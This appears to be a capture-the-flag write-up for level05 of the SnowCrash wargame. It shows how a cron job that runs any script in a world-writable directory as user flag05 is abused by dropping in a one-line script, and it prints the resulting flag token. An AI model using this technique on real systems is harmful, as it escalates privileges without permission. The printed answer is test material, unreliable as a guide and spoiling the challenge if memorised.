@@ -1,0 +1,53 @@
+When logging into level05 you get this:
+
+level05@SnowCrash's password:
+You have new mail.
+level05@SnowCrash:~$
+
+"You have new mail" 
+
+https://superuser.com/questions/395922/postfix-mail-storage-files
+
+Emails are stored into /var/mail on Linux systems.
+
+~$ ls /var/mail
+level05
+~$ cat /var/mail/level05
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+This is a cron that runs every 2 minutes, executing the command as the user flag05
+It just execute this script /usr/sbin/openarenaserver every two minutes
+Let's see what's this script does
+
+```
+~$ cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+```
+
+Overall, this script will execute all scripts present
+in the /opt/openarenaserver directory, with a time limit to prevent
+any single script from consuming too many resources or running
+for too long thanks to ulimit.
+
+As we saw the script is runned as the flag05 user so the exploit is pretty obvious
+We could just create a script that will run getflag and store the result in a file,
+then wait for the cron to execute the /usr/sbin/openarenaserver script.
+
+Solution:
+
+- Create the script and place it in /opt/openarenaserver directory
+
+~$ touch /opt/openarenaserver/exploit.sh
+~$ echo "/bin/getflag > /tmp/flag" > /opt/openarenaserver/exploit.sh
+
+- Wait for the cron to execute the /usr/sbin/openarenaserver script (every 2 minutes)
+- It should delete the exploit.sh
+- Then cat the result that we stored in /tmp/flag
+
+~$ cat /tmp/flag
+Check flag.Here is your token : viuaaale9huek52boumoomioc
